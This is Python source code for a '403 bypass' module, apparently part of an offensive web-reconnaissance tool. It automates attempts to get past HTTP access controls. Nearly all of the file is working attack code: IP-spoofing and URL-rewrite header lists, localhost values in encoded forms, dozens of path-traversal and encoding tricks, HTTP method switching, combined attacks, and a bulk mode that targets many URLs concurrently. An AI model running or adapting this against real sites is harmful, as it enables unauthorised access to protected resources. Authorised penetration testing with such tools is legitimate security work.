"""
ReconBuster 403 Bypass Module
Combines 150+ techniques from: 40XHeaderBypasser, bye403, bypass-403, YA403BT
Plus PayloadsAllTheThings directory traversal and SSRF payloads
"""

import asyncio
import aiohttp
import random
import hashlib
from typing import List, Dict, Set, Callable, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, quote, unquote
from .utils import (
    AsyncHTTPClient, ScanResult, normalize_url,
    colorize, format_time, USER_AGENTS
)

@dataclass
class BypassResult:
    """Result of a 403 bypass attempt"""
    original_url: str
    bypass_url: str
    technique: str
    category: str
    status_code: int
    original_status: int = 403
    content_length: int = 0
    response_time: float = 0.0
    headers_used: Dict = field(default_factory=dict)
    method_used: str = "GET"
    is_bypass: bool = False
    evidence: str = ""
    confidence: str = "low"  # low, medium, high
    content_hash: str = ""


class Bypass403:
    """
    Advanced 403 Forbidden Bypass Engine

    Techniques:
    1. Header-based bypasses (50+ headers)
    2. Path manipulation (40+ techniques)
    3. HTTP method switching (40+ methods)
    4. URL encoding variations
    5. Protocol manipulation
    6. Combined attacks
    """

    # IP Spoofing Headers
    IP_HEADERS = [
        "X-Forwarded-For",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "X-Real-IP",
        "True-Client-IP",
        "Cluster-Client-IP",
        "X-ProxyUser-Ip",
        "X-Custom-IP-Authorization",
        "Forwarded-For",
        "X-Forwarded",
        "Forwarded",
        "Client-IP",
        "CF-Connecting-IP",
        "Fastly-Client-IP",
        "X-Cluster-Client-IP",
        "X-Forwarded-For-Original",
    ]

    # IP Values to try
    IP_VALUES = [
        "127.0.0.1",
        "localhost",
        "127.0.0.1, 127.0.0.2",
        "127.0.0.1:80",
        "127.0.0.1:443",
        "2130706433",  # Decimal
        "0x7F000001",  # Hex
        "0177.0000.0000.0001",  # Octal
        "127.1",
        "127.0.1",
        "0",
        "0.0.0.0",
        "10.0.0.1",
        "10.0.0.0",
        "172.16.0.1",
        "192.168.1.1",
        "192.168.0.1",
        "::1",
        "::ffff:127.0.0.1",
        "0000::1",
    ]

    # URL Rewrite Headers
    URL_HEADERS = [
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Override-URL",
        "X-HTTP-DestinationURL",
        "X-Forwarded-Path",
        "X-Forwarded-Uri",
        "Destination",
        "Request-Uri",
    ]

    # Host Headers
    HOST_HEADERS = [
        "X-Host",
        "X-Forwarded-Host",
        "Forwarded-Host",
        "X-Forwarded-Server",
        "X-Original-Host",
        "Host",
    ]

    # HTTP Methods
    HTTP_METHODS = [
        "GET", "POST", "PUT", "DELETE", "PATCH",
        "HEAD", "OPTIONS", "TRACE", "CONNECT",
        # WebDAV
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
        "MOVE", "LOCK", "UNLOCK", "SEARCH",
        "REPORT", "MKACTIVITY", "CHECKOUT", "MERGE",
        "M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
        "PURGE", "LINK", "UNLINK", "ACL",
        # Custom
        "FOOBAR", "TEST", "DEBUG",
    ]

    # Path manipulation patterns
    PATH_PATTERNS = [
        "/{path}",
        "/{path}/",
        "/{path}//",
        "//{path}",
        "//{path}//",
        "/./{path}",
        "/{path}/.",
        "/{path}/..",
        "/{path}..;/",
        "/{path};/",
        "/{path}%20",
        "/{path}%09",
        "/{path}%00",
        "/{path}?",
        "/{path}??",
        "/{path}#",
        "/{path}.html",
        "/{path}.json",
        "/{path}.php",
        "/{path}.css",
        "/{path}.js",
        "/{path}....json",
        "/{path}%00.json",
        "/{path}?anything",
        "/{path}#anything",
        "/{path}~",
        "/{path}@",
        "/{path}*",
        # URL Encoding
        "/%2e/{path}",
        "/%2e%2e/{path}",
        "/{path}%2f",
        "/{path}%2f/",
        "/%252e/{path}",
        "/%252e%252e/{path}",
        # Semicolon
        "/;/{path}",
        "/.;/{path}",
        "//;/{path}",
        "/{path};foo=bar",
        # Unicode
        "/%ef%bc%8f{path}",
        # Case
        "/{PATH}",  # Uppercase
        # Double encoding
        "/{path}%252f",
        "/%2e%2e%2f{path}",
        "/%2e%2e/{path}",
        # Backslash
        "/..%5c{path}",
        "/{path}%5c",
        # Null byte
        "/..%00/{path}",
        "/{path}%00",
        # Special
        "/../{path}",
        "/..;/{path}",
        "/{path}/..;/",
        "/./{path}/./",
        "//{path}/..",
    ]

    def __init__(self, target_url: str, callback: Callable = None,
                 threads: int = 30, timeout: int = 10,
                 verify_ssl: bool = False):
        self.target_url = normalize_url(target_url)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.verify_ssl = verify_ssl

        # Parse URL components
        parsed = urlparse(self.target_url)
        self.scheme = parsed.scheme
        self.host = parsed.netloc
        self.path = parsed.path or "/"
        self.base_url = f"{self.scheme}://{self.host}"

        self.results: List[BypassResult] = []
        self.successful_bypasses: List[BypassResult] = []
        self.original_response: Optional[ScanResult] = None
        self.original_hash: str = ""

        # Stats
        self.stats = {
            "total_attempts": 0,
            "successful_bypasses": 0,
            "header_bypasses": 0,
            "path_bypasses": 0,
            "method_bypasses": 0,
            "errors": 0
        }

    async def emit(self, event: str, data: dict):
        """Emit event to callback"""
        if self.callback:
            await self.callback(event, data)

    async def bypass(self) -> List[BypassResult]:
        """Main bypass method - runs all techniques"""
        await self.emit("status", {
            "message": f"Starting 403 bypass on {self.target_url}",
            "target": self.target_url
        })

        # Get original response for comparison
        await self._get_original_response()

        if not self.original_response:
            await self.emit("error", {"message": "Cannot reach target URL"})
            return []

        await self.emit("original", {
            "status": self.original_response.status_code,
            "length": self.original_response.response_length,
            "hash": self.original_hash
        })

        # Run all bypass techniques concurrently
        await asyncio.gather(
            self._header_bypasses(),
            self._path_bypasses(),
            self._method_bypasses(),
            self._combined_bypasses(),
            return_exceptions=True
        )

        # Filter and deduplicate results
        self._filter_results()

        await self.emit("complete", {
            "results": [r.__dict__ for r in self.successful_bypasses],
            "stats": self.stats
        })

        return self.successful_bypasses

    async def _get_original_response(self):
        """Get original response for baseline comparison"""
        async with AsyncHTTPClient(timeout=self.timeout, verify_ssl=self.verify_ssl) as client:
            self.original_response = await client.get(self.target_url)
            if self.original_response:
                self.original_hash = self.original_response.content_hash

    async def _make_request(self, url: str, method: str = "GET",
                           headers: Dict = None, technique: str = "",
                           category: str = "") -> Optional[BypassResult]:
        """Make a single bypass attempt"""
        self.stats["total_attempts"] += 1

        try:
            connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
            timeout = aiohttp.ClientTimeout(total=self.timeout)

            request_headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Connection": "close"
            }

            if headers:
                request_headers.update(headers)

            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.request(
                    method=method,
                    url=url,
                    headers=request_headers,
                    allow_redirects=False
                ) as response:
                    content = await response.text()
                    content_hash = hashlib.md5(content.encode()).hexdigest()

                    result = BypassResult(
                        original_url=self.target_url,
                        bypass_url=url,
                        technique=technique,
                        category=category,
                        status_code=response.status,
                        original_status=self.original_response.status_code if self.original_response else 403,
                        content_length=len(content),
                        headers_used=headers or {},
                        method_used=method,
                        content_hash=content_hash
                    )

                    # Check if bypass successful
                    if self._is_bypass_successful(result):
                        result.is_bypass = True
                        result.confidence = self._calculate_confidence(result)
                        result.evidence = self._extract_evidence(content)
                        self.successful_bypasses.append(result)
                        self.stats["successful_bypasses"] += 1

                        await self.emit("bypass_found", {
                            "technique": technique,
                            "category": category,
                            "url": url,
                            "status": result.status_code,
                            "confidence": result.confidence
                        })

                    return result

        except Exception as e:
            self.stats["errors"] += 1
            return None

    def _is_bypass_successful(self, result: BypassResult) -> bool:
        """Determine if bypass was successful"""
        # Status code changed from 403/401 to 200
        if result.original_status in [401, 403] and result.status_code == 200:
            # Check content is different (not false positive)
            if result.content_hash != self.original_hash:
                return True

        # Status code changed to redirect (potential bypass)
        if result.original_status in [401, 403] and result.status_code in [301, 302, 307, 308]:
            return True

        return False

    def _calculate_confidence(self, result: BypassResult) -> str:
        """Calculate bypass confidence level"""
        if result.status_code == 200:
            if result.content_length > 500:
                return "high"
            elif result.content_length > 100:
                return "medium"
        return "low"

    def _extract_evidence(self, content: str) -> str:
        """Extract evidence from response"""
        # Get first 200 chars of content
        return content[:200].replace('\n', ' ').strip()

    async def _header_bypasses(self):
        """Try all header-based bypasses"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []

        # IP Spoofing headers
        for header in self.IP_HEADERS:
            for ip_value in self.IP_VALUES:
                async def try_ip_header(h=header, v=ip_value):
                    async with semaphore:
                        await self._make_request(
                            self.target_url,
                            headers={h: v},
                            technique=f"{h}: {v}",
                            category="header_ip_spoof"
                        )
                tasks.append(try_ip_header())

        # URL Rewrite headers
        for header in self.URL_HEADERS:
            for path_value in ["/", self.path, "/admin", "/api"]:
                async def try_url_header(h=header, v=path_value):
                    async with semaphore:
                        await self._make_request(
                            self.base_url + "/",
                            headers={h: v},
                            technique=f"{h}: {v}",
                            category="header_url_rewrite"
                        )
                tasks.append(try_url_header())

        # Host headers
        for header in self.HOST_HEADERS:
            for host_value in ["127.0.0.1", "localhost", self.host]:
                async def try_host_header(h=header, v=host_value):
                    async with semaphore:
                        headers = {h: v} if h != "Host" else {}
                        if h == "Host":
                            headers["Host"] = v
                        await self._make_request(
                            self.target_url,
                            headers=headers,
                            technique=f"{h}: {v}",
                            category="header_host"
                        )
                tasks.append(try_host_header())

        # Method override headers
        for method in ["GET", "PUT", "POST", "DELETE"]:
            async def try_method_override(m=method):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        method="POST",
                        headers={"X-HTTP-Method-Override": m},
                        technique=f"X-HTTP-Method-Override: {m}",
                        category="header_method_override"
                    )
            tasks.append(try_method_override())

        # Special headers
        special_headers = [
            {"X-Requested-With": "XMLHttpRequest"},
            {"Content-Length": "0"},
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Port": "443"},
            {"Referer": self.target_url},
            {"Origin": self.base_url},
        ]

        for headers in special_headers:
            async def try_special(h=headers):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        headers=h,
                        technique=str(h),
                        category="header_special"
                    )
            tasks.append(try_special())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["header_bypasses"] = len(tasks)

    async def _path_bypasses(self):
        """Try all path manipulation bypasses"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        for pattern in self.PATH_PATTERNS:
            # Replace placeholders
            if "{path}" in pattern:
                new_path = pattern.replace("{path}", path)
            elif "{PATH}" in pattern:
                new_path = pattern.replace("{PATH}", path.upper())
            else:
                new_path = pattern

            url = f"{self.base_url}{new_path}"

            async def try_path(u=url, p=pattern):
                async with semaphore:
                    await self._make_request(
                        u,
                        technique=p,
                        category="path_manipulation"
                    )
            tasks.append(try_path())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["path_bypasses"] = len(tasks)

    async def _method_bypasses(self):
        """Try different HTTP methods"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []

        for method in self.HTTP_METHODS:
            async def try_method(m=method):
                async with semaphore:
                    await self._make_request(
                        self.target_url,
                        method=m,
                        technique=f"HTTP Method: {m}",
                        category="method_change"
                    )
            tasks.append(try_method())

        # Try HTTP/1.0
        async def try_http10():
            async with semaphore:
                try:
                    connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        # Note: aiohttp doesn't directly support HTTP/1.0
                        # but we can try with close connection
                        async with session.get(
                            self.target_url,
                            headers={"Connection": "close"}
                        ) as response:
                            pass
                except:
                    pass
        tasks.append(try_http10())

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stats["method_bypasses"] = len(tasks)

    async def _combined_bypasses(self):
        """Try combined bypass techniques"""
        semaphore = asyncio.Semaphore(self.threads)
        tasks = []
        path = self.path.strip('/')

        # Combine path + header
        combined_attacks = [
            # Path + IP header
            (f"{self.base_url}/%2e/{path}", {"X-Forwarded-For": "127.0.0.1"}),
            (f"{self.base_url}//{path}//", {"X-Original-URL": f"/{path}"}),
            (f"{self.base_url}/{path}%00", {"X-Rewrite-URL": f"/{path}"}),
            (f"{self.base_url}/.;/{path}", {"X-Custom-IP-Authorization": "127.0.0.1"}),

            # Different method + header
            (self.target_url, {"X-HTTP-Method-Override": "GET", "X-Forwarded-For": "127.0.0.1"}),
            (self.target_url, {"X-Original-URL": f"/{path}", "X-Forwarded-For": "127.0.0.1"}),
        ]

        for url, headers in combined_attacks:
            async def try_combined(u=url, h=headers):
                async with semaphore:
                    await self._make_request(
                        u,
                        headers=h,
                        technique=f"Combined: {h}",
                        category="combined"
                    )
            tasks.append(try_combined())

        await asyncio.gather(*tasks, return_exceptions=True)

    def _filter_results(self):
        """Filter and deduplicate successful bypasses"""
        # Remove duplicates by content hash
        seen_hashes = set()
        filtered = []

        for result in self.successful_bypasses:
            if result.content_hash not in seen_hashes:
                seen_hashes.add(result.content_hash)
                filtered.append(result)

        # Sort by confidence
        confidence_order = {"high": 0, "medium": 1, "low": 2}
        filtered.sort(key=lambda x: confidence_order.get(x.confidence, 3))

        self.successful_bypasses = filtered

    def get_bypasses_by_category(self) -> Dict[str, List[BypassResult]]:
        """Group bypasses by category"""
        categories = {}
        for result in self.successful_bypasses:
            if result.category not in categories:
                categories[result.category] = []
            categories[result.category].append(result)
        return categories

    def get_high_confidence_bypasses(self) -> List[BypassResult]:
        """Get only high confidence bypasses"""
        return [r for r in self.successful_bypasses if r.confidence == "high"]


class Bypass403Bulk:
    """
    Bulk 403 bypass for multiple URLs
    """

    def __init__(self, urls: List[str], callback: Callable = None,
                 threads: int = 20, timeout: int = 10):
        self.urls = urls
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.all_results: Dict[str, List[BypassResult]] = {}

    async def emit(self, event: str, data: dict):
        if self.callback:
            await self.callback(event, data)

    async def bypass_all(self) -> Dict[str, List[BypassResult]]:
        """Bypass all URLs"""
        await self.emit("status", {
            "message": f"Starting bulk bypass on {len(self.urls)} URLs"
        })

        semaphore = asyncio.Semaphore(self.threads)

        async def bypass_url(url: str):
            async with semaphore:
                bypasser = Bypass403(
                    url,
                    callback=self.callback,
                    threads=10,
                    timeout=self.timeout
                )
                results = await bypasser.bypass()
                self.all_results[url] = results
                return results

        tasks = [bypass_url(url) for url in self.urls]
        await asyncio.gather(*tasks, return_exceptions=True)

        await self.emit("bulk_complete", {
            "total_urls": len(self.urls),
            "successful": len([u for u, r in self.all_results.items() if r])
        })

        return self.all_results
